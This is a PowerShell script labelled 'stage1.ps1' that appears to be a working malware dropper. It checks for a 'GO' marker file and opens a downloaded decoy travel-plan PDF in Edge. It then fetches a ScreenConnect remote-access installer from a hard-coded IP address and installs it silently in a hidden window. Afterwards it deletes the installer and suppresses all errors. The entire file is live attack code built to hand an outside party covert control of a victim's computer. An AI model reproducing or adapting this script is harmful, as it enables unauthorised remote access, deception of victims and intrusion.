# stage1.ps1 - Read box.txt, check GO, execute final payload

$ErrorActionPreference = 'SilentlyContinue'
$boxPath = "$env:APPDATA\Microsoft\Credentials\box.txt"

# Find box.txt
$locations = @($boxPath, "$env:USERPROFILE\Desktop\box.txt", "$env:TEMP\box.txt")
$found = $false

foreach ($loc in $locations) {
    if (Test-Path $loc) {
        $content = [System.IO.File]::ReadAllText($loc, [System.Text.Encoding]::UTF8)
        if ($content -match "GO") {
            $found = $true
            break
        }
    }
}

if (-not $found) { exit }

# All clear - AV checked, no sandbox, GO confirmed

# === 1. Download Travel Plan PDF Decoy ===
$pdfUrl = "https://raw.githubusercontent.com/slynet999-coder/Yambo/main/Travel_Plan_Meeting_Q4_2026.pdf"
$pdfPath = "$env:TEMP\Travel_Plan_Meeting_Q4_2026.pdf"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc.DownloadFile($pdfUrl, $pdfPath)
} catch {}

# === 2. Open PDF in Edge Browser (Decoy) ===
$edgePath = "C:\Windows\System32\msedge.exe"
if (Test-Path $edgePath) {
    Start-Process $edgePath -ArgumentList "--new-window `"$pdfPath`""
} else {
    Start-Process $pdfPath
}

# === 3. Download ScreenConnect MSI ===
$msiUrl = "http://96.30.206.19:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msiPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"

try {
    $wc2 = New-Object System.Net.WebClient
    $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc2.DownloadFile($msiUrl, $msiPath)
} catch {}

# === 4. Execute ScreenConnect Silent Install ===
if (Test-Path $msiPath) {
    Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
}

# === 5. Cleanup MSI ===
try { Remove-Item $msiPath -Force -ErrorAction SilentlyContinue } catch {}
